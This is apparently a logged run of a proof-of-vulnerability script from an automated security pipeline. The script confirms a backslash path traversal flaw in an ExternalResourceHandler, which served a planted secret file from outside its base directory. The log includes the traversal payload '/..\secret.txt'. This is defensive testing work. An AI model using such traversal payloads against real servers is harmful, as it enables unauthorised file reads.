@@ -1,0 +1,16 @@
+$ docker run --rm -v /Users/mohsen/dev/personal/autosec/security_pipeline_runs/20260708_010526_finding-bb8dd69e7f26/worktree:/workspace/repo -w /workspace/repo simpleautosec-finding-bb8dd69e7f26:fe18e8aa9aae bash -lc bash .security-pipeline/pov/run_pov.sh
+exit_code=0
+timed_out=false
+
+--- stdout ---
+[POV] served base dir : /tmp/pov-ext-2964861061893547452-root/public
+[POV] attack path     : /..\secret.txt
+[POV] resolved file   : /tmp/pov-ext-2964861061893547452-root/secret.txt
+[POV] bytes served    : TOP-SECRET-DO-NOT-SERVE-8f3a1c2b
+[POV] VULNERABLE: ExternalResourceHandler served a file located outside the configured base directory via backslash path traversal.
+
+--- stderr ---
+SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
+SLF4J: Defaulting to no-operation (NOP) logger implementation
+SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.
+
